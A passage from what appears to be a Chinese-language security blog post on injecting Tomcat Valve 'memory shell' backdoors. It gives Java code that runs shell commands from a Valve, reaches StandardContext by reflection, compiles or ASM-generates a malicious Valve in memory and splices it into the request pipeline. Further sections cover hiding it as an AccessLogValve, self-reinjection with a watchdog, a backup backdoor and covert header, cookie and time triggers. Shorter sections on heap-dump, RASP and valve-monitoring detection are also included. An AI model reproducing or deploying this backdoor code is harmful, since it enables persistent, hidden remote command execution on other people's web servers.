function_">getProperty</span>(<span class="hljs-string">&quot;os.name&quot;</span>).<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;win&quot;</span>) <br>                ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125; <br>                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmds);<br>            <span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> = p.<span class="hljs-title function_">getInputStream</span>();<br>            <span class="hljs-comment">// ... 读取输出并写入response ...</span><br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;<br>            response.<span class="hljs-title function_">getWriter</span>().<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;ERROR: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 其他Valve接口方法（空实现）</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">Valve</span> <span class="hljs-title function_">getNext</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setNext</span>(<span class="hljs-params"><span class="hljs-title class_">Valve</span> valve</span>) &#123;&#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">backgroundProcess</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="四、技术难点与规避方案"><a href="#四、技术难点与规避方案" class="headerlink" title="四、技术难点与规避方案"></a><strong>四、技术难点与规避方案</strong></h3><ol><li><p><strong>ClassLoader穿透问题</strong></p><ul><li><p>场景：在<code>BootstrapClassLoader</code>中执行（如反序列化漏洞）</p></li><li><p>方案：通过线程上下文类加载器传递</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Thread<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.setContextClassLoader</span>(webappClassLoader);<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>Tomcat版本兼容性</strong></p><ul><li><p><code>StandardRoot</code>路径变化（Tomcat 8.0+）：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// Tomcat 8.5+ 获取StandardContext</span><br>Object resources = webappClassLoader.getResources()<span class="hljs-punctuation">;</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getContextMethod</span> = <span class="hljs-title function_">resources</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getContext&quot;)</span>;<br>Object standardContext = getContextMethod.invoke(resources)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>内存马隐身技巧</strong></p><ul><li>类名伪装：<code>com.sun.tools.javac.util.Context</code>（仿JDK类）</li><li>字节码加密：运行时解密后再defineClass</li><li>惰性加载：首次匹配密码时才初始化命令执行逻辑</li></ul></li></ol><h3 id="五、检测与防御手段"><a href="#五、检测与防御手段" class="headerlink" title="五、检测与防御手段"></a><strong>五、检测与防御手段</strong></h3><h4 id="检测方案"><a href="#检测方案" class="headerlink" title="检测方案"></a><strong>检测方案</strong></h4><ol><li><p><strong>Heap Dump分析</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> java.lang.<span class="hljs-keyword">Object</span> <br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">toString</span>() <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&quot;%StandardContextValve%&quot;</span> <br><span class="hljs-keyword">AND</span> dominators() INCLUDES $.valves<br></code></pre></td></tr></table></figure><ul><li>定位<code>StandardPipeline.valves</code>数组中异常Valve</li></ul></li><li><p><strong>RASP监控点</strong></p><ul><li>拦截<code>ClassLoader.defineClass()</code>调用</li><li>监控<code>StandardPipeline.addValve()</code>反射调用栈</li><li>检测非初始化阶段新增的Valve</li></ul></li><li><p><strong>行为特征检测</strong></p><ul><li>请求头包含<code>X-TOKEN</code>等固定标记</li><li>无关联页面的HTTP请求返回命令输出</li></ul></li></ol><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 禁用Context的管道修改 (context.xml) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span> <span class="hljs-attr">allowPipelineModification</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><p><strong>策略限制</strong></p><ul><li>禁止反射调用<code>defineClass()</code>（SecurityManager）</li><li>锁定<code>StandardPipeline.valves</code>数组写权限</li></ul></li><li><p><strong>运行时加固</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-javaagent:rasp_agent.<span class="hljs-attribute">jar</span>=block_unauth_valve<br></code></pre></td></tr></table></figure></li></ol><h2 id="混合方式（利用-Tomcat-API-反射）"><a href="#混合方式（利用-Tomcat-API-反射）" class="headerlink" title="混合方式（利用 Tomcat API &amp; 反射）"></a>混合方式（利用 Tomcat API &amp; 反射）</h2><h3 id="一、混合注入的核心优势"><a href="#一、混合注入的核心优势" class="headerlink" title="一、混合注入的核心优势"></a>一、混合注入的核心优势</h3><ol><li><strong>效率与稳定性的平衡</strong>：<ul><li>使用Tomcat API直接调用核心方法，减少反射操作</li><li>对关键路径使用反射突破访问限制</li><li>比纯反射方式更稳定，减少版本兼容问题</li></ul></li><li><strong>降低检测风险</strong>：<ul><li>减少反射调用次数，避免触发RASP的反射监控</li><li>直接API调用混入正常业务逻辑中更隐蔽</li></ul></li><li><strong>开发便利性</strong>：<ul><li>代码可读性更高</li><li>调试和维护更简单</li></ul></li></ol><h3 id="二、混合注入详细流程"><a href="#二、混合注入详细流程" class="headerlink" title="二、混合注入详细流程"></a>二、混合注入详细流程</h3><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><ul><li>已获得执行环境（如通过JSP WebShell或反序列化漏洞）</li><li>Tomcat API库（catalina.jar）在类路径中可用</li><li>当前ClassLoader是WebappClassLoader</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 获取当前Web应用的ClassLoader<br>WebappClassLoader classLoader <span class="hljs-operator">=</span> <br>    (WebappClassLoader) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>步骤1：获取StandardContext对象（混合方式）</strong></p><h4 id="方法A：通过ServletContext（推荐）"><a href="#方法A：通过ServletContext（推荐）" class="headerlink" title="方法A：通过ServletContext（推荐）"></a>方法A：通过ServletContext（推荐）</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 在JSP/Servlet环境中可直接获取request<br>ServletRequest request <span class="hljs-operator">=</span> ...<span class="hljs-comment">; </span><br><br>// 获取ServletContext<br>ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">;</span><br><br>// 反射获取ApplicationContext<br>Field appCtxField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>appCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>ApplicationContext appCtx <span class="hljs-operator">=</span> (ApplicationContext) appCtxField.get(servletContext)<span class="hljs-comment">;</span><br><br>// 反射获取StandardContext<br>Field stdCtxField <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>stdCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) stdCtxField.get(appCtx)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="方法B：通过ClassLoader（无request时）"><a href="#方法B：通过ClassLoader（无request时）" class="headerlink" title="方法B：通过ClassLoader（无request时）"></a>方法B：通过ClassLoader（无request时）</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 反射获取WebappClassLoader的resources字段<br>Field resourcesField <span class="hljs-operator">=</span> WebappClassLoader.class.getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardRoot standardRoot <span class="hljs-operator">=</span> (StandardRoot) resourcesField.get(classLoader)<span class="hljs-comment">;</span><br><br>// 直接API调用获取Context<br>Context context <span class="hljs-operator">=</span> standardRoot.getContext()<span class="hljs-comment">; // Tomcat 8.5+</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) context<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>步骤2：获取Pipeline对象（直接API）</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 直接调用StandardContext的API方法<br>Pipeline pipeline <span class="hljs-operator">=</span> standardContext.getPipeline()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>步骤3：创建恶意Valve实例</strong></p><h4 id="方法A：动态类定义（无文件落地）"><a href="#方法A：动态类定义（无文件落地）" class="headerlink" title="方法A：动态类定义（无文件落地）"></a>方法A：动态类定义（无文件落地）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 定义恶意Valve类（简化版）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StealthValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TRIGGER_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X-Health-Check&quot;</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-keyword">if</span> (request.getHeader(TRIGGER_HEADER) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 命令执行逻辑...</span><br>        &#125;<br>        getNext().invoke(request, response);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 在内存中编译类（使用Java Compiler API）</span><br><span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();<br><span class="hljs-type">StandardJavaFileManager</span> <span class="hljs-variable">fileManager</span> <span class="hljs-operator">=</span> <br>    compiler.getStandardFileManager(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// 动态生成源码</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sourceCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;...&quot;</span>; <span class="hljs-comment">// 完整的StealthValve源码</span><br><span class="hljs-type">JavaFileObject</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleJavaFileObject</span>(URI.create(<span class="hljs-string">&quot;string:///StealthValve.java&quot;</span>), <br>        JavaFileObject.Kind.SOURCE) &#123;<br>        <span class="hljs-keyword">public</span> CharSequence <span class="hljs-title function_">getCharContent</span><span class="hljs-params">(<span class="hljs-type">boolean</span> ignoreEncodingErrors)</span> &#123;<br>            <span class="hljs-keyword">return</span> sourceCode;<br>        &#125;<br>    &#125;;<br><br><span class="hljs-comment">// 编译到内存</span><br><span class="hljs-type">CompilationTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> compiler.getTask(<span class="hljs-literal">null</span>, fileManager, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, Arrays.asList(source));<br>task.call();<br><br><span class="hljs-comment">// 加载编译后的类</span><br>Class&lt;?&gt; valveClass = classLoader.loadClass(<span class="hljs-string">&quot;com.example.StealthValve&quot;</span>);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure><h4 id="方法B：字节码注入（ASM增强）"><a href="#方法B：字节码注入（ASM增强）" class="headerlink" title="方法B：字节码注入（ASM增强）"></a>方法B：字节码注入（ASM增强）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用ASM动态生成Valve字节码</span><br><span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br>cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, <br>    <span class="hljs-string">&quot;com/evil/HealthCheckValve&quot;</span>, <span class="hljs-literal">null</span>, <br>    <span class="hljs-string">&quot;org/apache/catalina/valves/ValveBase&quot;</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// 生成invoke方法...</span><br><span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> cw.visitMethod(Opcodes.ACC_PUBLIC, <span class="hljs-string">&quot;invoke&quot;</span>, <br>    <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>, <br>    <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <br><span class="hljs-comment">// 方法逻辑：检查Header-&gt;执行命令-&gt;回传结果</span><br>mv.visitCode();<br><span class="hljs-comment">// ... 字节码指令 ...</span><br>mv.visitEnd();<br><br><span class="hljs-comment">// 定义类</span><br><span class="hljs-type">byte</span>[] bytecode = cw.toByteArray();<br>Class&lt;?&gt; valveClass = classLoader.defineClass(<br>    <span class="hljs-string">&quot;com.evil.HealthCheckValve&quot;</span>, bytecode, <span class="hljs-number">0</span>, bytecode.length);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure><p><strong>步骤4：注入Valve到管道（API+反射）</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// 直接API方式添加Valve</span><br>pipeline.addValve(evilValve);<br><br><span class="hljs-comment">// 调整位置到关键节点（反射操作）</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.<span class="hljs-keyword">get</span>(pipeline);<br><br><span class="hljs-comment">// 查找StandardContextValve的位置</span><br><span class="hljs-built_in">int</span> targetIndex = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>    <span class="hljs-keyword">if</span> (valves[i] instanceof StandardContextValve) &#123;<br>        targetIndex = i;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 在StandardContextValve前插入</span><br><span class="hljs-keyword">if</span> (targetIndex != <span class="hljs-number">-1</span>) &#123;<br>    Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.length + <span class="hljs-number">1</span>];<br>    System.arraycopy(valves, <span class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, targetIndex);<br>    newValves[targetIndex] = evilValve;<br>    System.arraycopy(valves, targetIndex, newValves, <br>        targetIndex + <span class="hljs-number">1</span>, valves.length - targetIndex);<br>    valvesField.<span class="hljs-keyword">set</span>(pipeline, newValves);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三、高级隐蔽技术"><a href="#三、高级隐蔽技术" class="headerlink" title="三、高级隐蔽技术"></a>三、高级隐蔽技术</h3><p><strong>1. Valve伪装技术</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 继承官方Valve类，减少特征</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccessLogValveProxy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AccessLogValve</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> Valve original;<br>    <span class="hljs-keyword">private</span> Valve malicious;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AccessLogValveProxy</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>        <span class="hljs-built_in">this</span>.malicious = createMaliciousValve();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-comment">// 恶意逻辑检查</span><br>        <span class="hljs-keyword">if</span> (isMaliciousRequest(request)) &#123;<br>            malicious.invoke(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 正常逻辑</span><br>        original.invoke(request, response);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 替换原始Valve</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceOriginalValve</span><span class="hljs-params">(Pipeline pipeline)</span> &#123;<br>        Valve[] valves = pipeline.getValves();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (valves[i] <span class="hljs-keyword">instanceof</span> AccessLogValve) &#123;<br>                valves[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccessLogValveProxy</span>(valves[i]);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-自保护机制"><a href="#2-自保护机制" class="headerlink" title="2. 自保护机制"></a>2. 自保护机制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在Valve中添加自检和恢复逻辑</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-comment">// 1. 检查自身是否仍在管道中</span><br>    <span class="hljs-keyword">if</span> (!isValveInPipeline(<span class="hljs-built_in">this</span>)) &#123;<br>        reinjectSelf(); <span class="hljs-comment">// 重新注入</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 2. 检查其他内存马是否存在</span><br>    <span class="hljs-keyword">if</span> (!isBackdoorPresent()) &#123;<br>        deploySecondaryBackdoor(); <span class="hljs-comment">// 部署备用后门</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. 正常恶意逻辑...</span><br>&#125;<br><br><span class="hljs-comment">// 定时检查线程</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startWatchdog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            checkValveStatus();<br>            checkSecurityTools();<br>            Thread.sleep(<span class="hljs-number">300000</span>); <span class="hljs-comment">// 5分钟检查一次</span><br>        &#125;<br>    &#125;).start();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-上下文感知触发"><a href="#3-上下文感知触发" class="headerlink" title="3. 上下文感知触发"></a>3. 上下文感知触发</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 基于请求上下文动态激活</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldActivate</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// 1. 检查特定Header</span><br>    <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-comment">// 2. 检查特殊URL模式</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>    <span class="hljs-keyword">if</span> (uri.contains(<span class="hljs-string">&quot;;jsessionid=&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sessionPart</span> <span class="hljs-operator">=</span> uri.split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">return</span> validateSessionToken(sessionPart);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. 检查特定Cookie值</span><br>    Cookie[] cookies = request.getCookies();<br>    <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;debug_mode&quot;</span>.equals(cookie.getName())) &#123;<br>            <span class="hljs-keyword">return</span> checkCookieSignature(cookie.getValue());<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 4. 时间窗口激活</span><br>    <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">return</span> (currentTime % <span class="hljs-number">60000</span>) &lt; <span class="hljs-number">5000</span>; <span class="hljs-comment">// 每分钟激活5秒</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="四、检测与防御方案"><a href="#四、检测与防御方案" class="headerlink" title="四、检测与防御方案"></a>四、检测与防御方案</h3><p><strong>检测技术</strong></p><ol><li><p><strong>运行时管道分析</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorValves</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> getCurrentContext();<br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> ctx.getPipeline();<br>    Valve[] valves = pipeline.getValves();<br><br>    <span class="hljs-keyword">for</span> (Valve valve : valves) &#123;<br>        <span class="hljs-comment">// 检测未签名的Valve</span><br>        <span class="hljs-keyword">if</span> (!isSigned(valve.getClass())) &#123;<br>            alertSuspiciousValve(valve);<br>        &#125;<br><br>        <span class="hljs-comment">// 检测类加载来源</span><br>        <span class="hljs-keyword">if</span> (valve.getClass().getClassLoader() != ctx.getLoader().getClassLoader()) &#123;<br>            alertForeignClassLoader(valve);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>字节码校验技术</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 使用jvmti代理进行类校验</span><br><span class="hljs-keyword">java </span>-agentpath:valve_checker.so=<span class="hljs-keyword">org.apache.catalina.core.StandardPipeline 